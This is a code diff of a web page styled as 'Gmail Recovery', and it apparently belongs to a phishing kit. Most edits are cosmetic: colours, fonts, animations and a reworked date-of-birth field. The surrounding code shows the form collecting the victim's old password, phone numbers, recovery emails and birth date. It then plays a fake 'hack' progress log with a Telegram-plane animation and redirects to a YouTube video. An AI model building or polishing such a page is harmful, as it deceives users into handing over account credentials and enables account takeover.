@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Gmail Account Recovery</title>
+    <title>Gmail Recovery</title>
     
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
@@ -14,7 +14,8 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: '-apple-system', BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            /* Enforcing Montserrat for Boldness across all devices */
+            font-family: 'Montserrat', '-apple-system', BlinkMacSystemFont, sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
@@ -45,6 +46,7 @@
             filter: blur(120px);
             opacity: 0.35;
             animation: float 20s infinite ease-in-out alternate;
+            will-change: transform;
         }
         .orb-1 {
             width: 400px; height: 400px; background: #4285F4; 
@@ -65,9 +67,9 @@
 
         @keyframes float {
             0% { transform: translate(0, 0) scale(1); }
-            33% { transform: translate(40px, -60px) scale(1.1); }
-            66% { transform: translate(-30px, 30px) scale(0.9); }
-            100% { transform: translate(50px, 50px) scale(1.05); }
+            33% { transform: translate(30px, -40px) scale(1.05); }
+            66% { transform: translate(-20px, 20px) scale(0.95); }
+            100% { transform: translate(40px, 40px) scale(1.02); }
         }
 
         /* Container & Glass Panel */
@@ -127,7 +129,6 @@
             margin-bottom: 30px;
         }
 
-        /* Removed shiny slide animation from title wrapper */
         .title-wrapper {
             position: relative;
             display: inline-block;
@@ -135,8 +136,7 @@
         }
 
         h1 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 1.8rem;
+            font-size: 2rem;
             text-transform: uppercase;
             font-weight: 900;
             letter-spacing: 1px;
@@ -157,7 +157,7 @@
             margin-bottom: 8px;
             font-size: 0.95rem;
             color: #c4c6ca;
-            font-weight: 600;
+            font-weight: 700; /* Made explicitly bolder for mobile */
             padding-left: 5px;
         }
 
@@ -168,9 +168,9 @@
         }
 
         .optional-text {
-            font-size: 0.75rem;
-            color: #8ab4f8; /* Light blueish grey for distinction */
-            font-weight: 500;
+            font-size: 0.8rem;
+            color: #FBBC05; /* Yellow Color */
+            font-weight: 600;
             margin-left: 4px;
             font-style: italic;
         }
@@ -183,40 +183,31 @@
             background: rgba(0, 0, 0, 0.4);
             color: #fff;
             font-size: 1.05rem;
+            font-weight: 600; /* Making input text bold */
             transition: all 0.3s ease;
             outline: none;
             box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
         }
 
-        /* Special CSS to make Date Calendar Icon Visible */
-        input[type="date"]::-webkit-calendar-picker-indicator {
-            filter: invert(1); /* Makes the black calendar icon white */
-            cursor: pointer;
-            opacity: 0.8;
-            transition: 0.2s;
-        }
-        input[type="date"]::-webkit-calendar-picker-indicator:hover {
-            opacity: 1;
-        }
-
+        /* User clicks -> Green Glowing Effect */
         input:focus { 
-            border-color: #4285F4; 
+            border-color: #34A853 !important; /* Green Focus */
             background: rgba(0, 0, 0, 0.6); 
-            box-shadow: 0 0 10px rgba(66, 133, 244, 0.3), inset 0 2px 5px rgba(0,0,0,0.2);
+            box-shadow: 0 0 12px rgba(52, 168, 83, 0.4), inset 0 2px 5px rgba(0,0,0,0.2) !important;
         }
-        input.input-error { border-color: #EA4335 !important; }
+        input.input-error { border-color: #EA4335 !important; box-shadow: 0 0 12px rgba(234, 67, 53, 0.4) !important;}
 
         /* CUSTOM DROPDOWN */
         .custom-select-wrapper { position: relative; width: 100%; z-index: 50; }
         .custom-select-trigger {
             width: 100%; padding: 15px 18px; border-radius: 12px; color: #fff;
             background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.1);
-            font-size: 1.05rem; display: flex; justify-content: space-between; align-items: center;
+            font-size: 1.05rem; font-weight: 600; display: flex; justify-content: space-between; align-items: center;
             cursor: pointer; transition: all 0.3s ease-in-out;
             box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
         }
         .custom-select-trigger:hover { background-color: rgba(255,255,255,0.05); }
-        .custom-select-wrapper.open .custom-select-trigger { border-color: #4285F4; box-shadow: 0 0 10px rgba(66, 133, 244, 0.3); }
+        .custom-select-wrapper.open .custom-select-trigger { border-color: #34A853; box-shadow: 0 0 12px rgba(52, 168, 83, 0.4); }
         .custom-select-wrapper.input-error .custom-select-trigger { border-color: #EA4335 !important; }
         
         .custom-select-options {
@@ -233,16 +224,16 @@
         }
         .custom-select-options li { 
             padding: 12px 15px; color: #ccc; cursor: pointer; border-radius: 8px; 
-            transition: all 0.2s ease-in-out; font-size: 1rem; text-align: left; 
+            transition: all 0.2s ease-in-out; font-size: 1rem; font-weight: 600; text-align: left; 
         }
-        .custom-select-options li:hover { background: rgba(66, 133, 244, 0.15); color: #fff; transform: translateX(5px); }
-        .custom-select-options li.selected { background: rgba(66, 133, 244, 0.25); color: #fff; font-weight: 600; border-left: 3px solid #4285F4;}
+        .custom-select-options li:hover { background: rgba(52, 168, 83, 0.15); color: #fff; transform: translateX(5px); }
+        .custom-select-options li.selected { background: rgba(52, 168, 83, 0.25); color: #fff; font-weight: 700; border-left: 3px solid #34A853;}
         
         ::-webkit-scrollbar { width: 5px; background: transparent; }
         ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 10px; }
         
         .fa-chevron-down { transition: transform 0.3s ease; color: #a0a0a5; }
-        .custom-select-wrapper.open .fa-chevron-down { transform: rotate(180deg); color: #4285F4; }
+        .custom-select-wrapper.open .fa-chevron-down { transform: rotate(180deg); color: #34A853; }
 
         .error-msg {
             color: #EA4335;
@@ -253,6 +244,7 @@
             display: none;
         }
 
+        /* Proceed Button with Logo */
         .btn-submit {
             background: linear-gradient(135deg, #34A853, #227c3a);
             color: #fff;
@@ -268,6 +260,16 @@
             margin-top: 20px;
             letter-spacing: 1.5px;
             box-shadow: 0 0 20px rgba(52, 168, 83, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px; /* Space between logo and text */
+        }
+
+        .btn-logo {
+            width: 26px;
+            height: 26px;
+            border-radius: 5px;
         }
 
         .btn-submit:hover { box-shadow: 0 0 30px rgba(52, 168, 83, 0.8); }
@@ -309,7 +311,6 @@
             color: #34A853 !important; 
             text-shadow: 0 0 12px #34A853 !important;
             transform: scaleY(1.8) translateZ(0) !important;
-            /* Increased Blur heavily as requested */
             filter: blur(2.8px) !important; 
             opacity: 0.55 !important;
             margin-bottom: 2px !important;
@@ -339,7 +340,7 @@
             content: '█';
             animation: blinkCursor 0.4s infinite;
             margin-left: 5px;
-            color: #4285F4;
+            color: #34A853; /* Changed to green */
         }
 
         @keyframes blinkCursor {
@@ -347,7 +348,6 @@
             50% { opacity: 0; }
         }
 
-        /* Normal Processing Phase Colors */
         .c-sys { color: #4285F4; text-shadow: 0 0 10px rgba(66, 133, 244, 0.8); }
         .c-data { color: #FBBC05; text-shadow: 0 0 10px rgba(251, 188, 5, 0.8); }
         .c-succ { color: #34A853; text-shadow: 0 0 10px rgba(52, 168, 83, 0.8); }
@@ -378,6 +378,7 @@
             text-transform: uppercase;
             display: inline-block; opacity: 0;
             will-change: transform, opacity;
+            backface-visibility: hidden; /* Added for smoothness */
         }
 
         /* BLINKING TRANSITION IMAGE */
@@ -432,7 +433,7 @@
         @media (max-width: 480px) {
             body { padding: 25px 15px; }
             .glass-panel { padding: 30px 20px; min-height: 480px; }
-            h1 { font-size: 1.6rem; }
+            h1 { font-size: 1.8rem; }
             .char { font-size: 2.2rem; }
             .transition-image { max-width: 30%; max-height: 30%; }
         }
@@ -502,7 +503,11 @@
 
                     <div class="form-group" style="z-index: 50;">
                         <label>Date of Birth <span class="optional-text">(Optional)</span></label>
-                        <input type="date" id="dob" style="color-scheme: dark;">
+                        <div style="position: relative; width: 100%;">
+                            <input type="text" id="dobInput" inputmode="numeric" placeholder="DD/MM/YYYY" maxlength="10">
+                            <input type="date" id="dobPicker" style="position: absolute; right: 10px; top: 12px; width: 30px; height: 30px; opacity: 0; padding: 0; border: none; z-index: 10; cursor: pointer;">
+                            <i class="fa-regular fa-calendar" style="position: absolute; right: 18px; top: 18px; color: #fff; pointer-events: none; z-index: 5;"></i>
+                        </div>
                     </div>
 
                     <div class="form-group" style="z-index: 40;">
@@ -522,7 +527,7 @@
 
                     <div class="form-group" id="otherOsGroup" style="display: none; z-index: 35;">
                         <label>Describe Your Device <span class="mandatory">*</span></label>
-                        <input type="text" id="otherOsDesc" placeholder="E.g., Samsung Galaxy S23, Custom ROM...">
+                        <input type="text" id="otherOsDesc" placeholder="Please describe your device">
                         <div class="error-msg" id="otherOsError">Please describe your device.</div>
                     </div>
 
@@ -542,7 +547,10 @@
                         <input type="email" id="contactEmail" placeholder="Email to contact you">
                     </div>
 
-                    <button type="button" class="btn-submit" id="proceedBtn">PROCEED</button>
+                    <button type="button" class="btn-submit" id="proceedBtn">
+                        <img src="https://pending404.github.io/g_ml/gml.gif" class="btn-logo" alt="logo">
+                        PROCEED
+                    </button>
                 </form>
             </div>
 
@@ -570,13 +578,12 @@
             // Set Individual Glowing letters for Main Page Header
             function setHeaderGlow() {
                 const headerText1 = "GMAIL";
-                const headerText2 = "ACCOUNT RECOVERY";
+                const headerText2 = "RECOVERY";
                 const h1Element = document.querySelector('#mainHeaderTitle h1');
                 
                 let htmlContent = "";
                 headerText1.split('').forEach((char, idx) => {
                     const color = colors[idx % colors.length];
-                    // Applying text color and exactly same color's deep glow
                     htmlContent += `<span style="color: ${color}; text-shadow: 0 0 15px ${color}, 0 0 35px ${color};">${char}</span>`;
                 });
                 htmlContent += "<br>";
@@ -610,6 +617,33 @@
             const rocketOverlay = document.getElementById('rocketOverlay');
             const telegramPlane = document.getElementById('telegramPlane');
 
+            // --- DATE OF BIRTH LOGIC ---
+            const dobInput = document.getElementById('dobInput');
+            const dobPicker = document.getElementById('dobPicker');
+
+            // 1. Auto Format when typing numbers
+            dobInput.addEventListener('input', function(e) {
+                let val = this.value.replace(/\D/g, ''); // Extract only numbers
+                if (val.length > 8) val = val.substring(0, 8);
+                
+                let formatted = val;
+                if (val.length > 2) {
+                    formatted = val.substring(0, 2) + '/' + val.substring(2);
+                }
+                if (val.length > 4) {
+                    formatted = formatted.substring(0, 5) + '/' + val.substring(4, 8);
+                }
+                this.value = formatted;
+            });
+
+            // 2. Sync Native Calendar selection to text input
+            dobPicker.addEventListener('change', function() {
+                if(this.value) {
+                    const parts = this.value.split('-'); // native returns YYYY-MM-DD
+                    dobInput.value = `${parts[2]}/${parts[1]}/${parts[0]}`;
+                }
+            });
+
             // --- FUNCTION TO CLEAR ALL VALIDATION ERRORS ---
             function clearAllValidationErrors() {
                 document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
@@ -617,7 +651,7 @@
                 glassPanel.classList.remove('shake');
             }
 
-            // --- 1. INTRO MAGNETIC VANISHING ANIMATION ---
+            // --- 1. INTRO MAGNETIC VANISHING ANIMATION (Smoother for Mobile) ---
             function runIntroAnimation() {
                 const text = "GMAIL RECOVERY";
                 introMagneticText.innerHTML = '';
@@ -637,12 +671,13 @@
                         span.style.color = color;
                         span.style.textShadow = `0 0 15px ${color}, 0 0 30px ${color}`;
                         
-                        const rx = (Math.random() - 0.5) * 3000;
-                        const ry = (Math.random() - 0.5) * 3000;
-                        const rz = (Math.random() - 0.5) * 1000;
-                        const rotate = (Math.random() - 0.5) * 720;
+                        // Optimized translate values for smoother render
+                        const rx = (Math.random() - 0.5) * 1500;
+                        const ry = (Math.random() - 0.5) * 1500;
+                        const rz = (Math.random() - 0.5) * 500;
+                        const rotate = (Math.random() - 0.5) * 360;
                         
-                        span.style.transform = `translate3d(${rx}px, ${ry}px, ${rz}px) rotate(${rotate}deg) scale(3)`;
+                        span.style.transform = `translate3d(${rx}px, ${ry}px, ${rz}px) rotate(${rotate}deg) scale(2)`;
                         
                         wordDiv.appendChild(span);
                         charElements.push(span);
@@ -657,22 +692,22 @@
                 setTimeout(() => {
                     charElements.forEach((span, i) => {
                         setTimeout(() => {
-                            span.style.transition = 'transform 1s cubic-bezier(0.165, 0.84, 0.44, 1), opacity 0.8s ease';
+                            span.style.transition = 'transform 0.8s cubic-bezier(0.165, 0.84, 0.44, 1), opacity 0.6s ease';
                             span.style.transform = 'translate3d(0,0,0) rotate(0deg) scale(1)';
                             span.style.opacity = '1';
-                        }, i * 40); 
+                        }, i * 35); 
                     });
                 }, 100);
 
-                const assembleTime = (charElements.length * 40) + 1000;
+                const assembleTime = (charElements.length * 35) + 800;
 
                 setTimeout(() => {
                     introMagneticText.style.opacity = '0';
-                    introMagneticText.style.transform = 'scale(1.1)';
-                    introMagneticText.style.filter = 'blur(10px)';
+                    introMagneticText.style.transform = 'scale(1.05)';
+                    introMagneticText.style.filter = 'blur(8px)';
                 }, assembleTime + 1000);
 
-                const vanishTime = assembleTime + 1800;
+                const vanishTime = assembleTime + 1600;
 
                 setTimeout(() => {
                     introOverlay.style.display = 'none';
@@ -805,7 +840,7 @@
                     oldPassword: document.getElementById('oldPassword').value || 'Not Provided',
                     oldPhone: document.getElementById('oldPhone').value || 'Not Provided',
                     oldRecoverEmail: document.getElementById('oldRecoverEmail').value || 'Not Provided',
-                    dob: document.getElementById('dob').value || 'Not Provided',
+                    dob: dobInput.value || 'Not Provided',
                     os: finalOsValue,
                     newRecoverEmail: document.getElementById('newRecoverEmail').value || 'Not Provided',
                     newPhone: newPhone.value,
@@ -879,7 +914,6 @@
                     
                     processLog.scrollTop = processLog.scrollHeight;
 
-                    // Let fast hack lines run for 2.5 seconds
                     if (progress < 2500) { 
                         reqAnimId = requestAnimationFrame(fastPhase);
                     } else {
@@ -940,7 +974,6 @@
                         telegramPlane.classList.add('fly-out');
                         
                         setTimeout(() => {
-                            // REDIRECT TO REQUESTED URL
                             window.location.href = "https://youtu.be/6ZkIWcec7vY?si=CizjCWdHX8gvF16z";
                         }, 400); 
                     }, 1000); 
